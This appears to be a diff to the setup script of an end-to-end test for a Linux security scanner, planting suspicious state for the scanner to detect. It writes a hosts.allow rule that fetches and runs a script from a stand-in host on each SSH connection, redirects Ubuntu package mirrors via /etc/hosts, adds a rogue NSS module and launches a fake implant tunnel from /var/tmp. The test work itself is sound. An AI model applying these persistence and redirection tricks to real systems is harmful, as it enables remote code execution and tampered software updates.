@@ -154,6 +154,27 @@ printf 'kernel/net/rds/rds.ko.zst:\nkernel/net/sctp/sctp.ko.zst:\nkernel/net/tip
 echo 'install tipc /bin/false' >/etc/modprobe.d/90-e2e.conf
 echo 'blacklist sctp' >/etc/modprobe.d/e2e-no-suffix
 
+# --- name resolution
+echo '203.0.113.5 security.ubuntu.com archive.ubuntu.com' >>/etc/hosts
+echo '10.0.0.5 ports.ubuntu.com' >>/etc/hosts
+# A library that belongs to no package, and a module glibc cannot use, so this
+# changes nothing for other programs in the container.
+touch /usr/lib/libnss_evilnss.so.2
+sed -i 's/^hosts:.*/hosts: files evilnss missingnss [NOTFOUND=return] dns/' /etc/nsswitch.conf
+echo 'sshd: ALL: spawn /bin/sh -c "curl http://x.example/a | sh"' >>/etc/hosts.allow
+
+# --- exposed services the listener check should name
+python3 -c 'import socket,time
+t=socket.socket(); t.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1); t.bind(("0.0.0.0",2379)); t.listen()
+u=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); u.bind(("0.0.0.0",161))
+time.sleep(86400)' >/dev/null 2>&1 &
+
+# --- a tunnel held by a program in a temp directory
+cp /opt/e2e/fakeimplant /var/tmp/vpn
+/var/tmp/vpn tunnel >/dev/null 2>&1 &
+sleep 1
+ip link set e2etun0 up 2>/dev/null
+
 # --- processes
 # A symlink made by an attacker gives argv[0] a path that resolves to the running
 # binary. Unlike udevd's, this one belongs to no package and must still be caught.
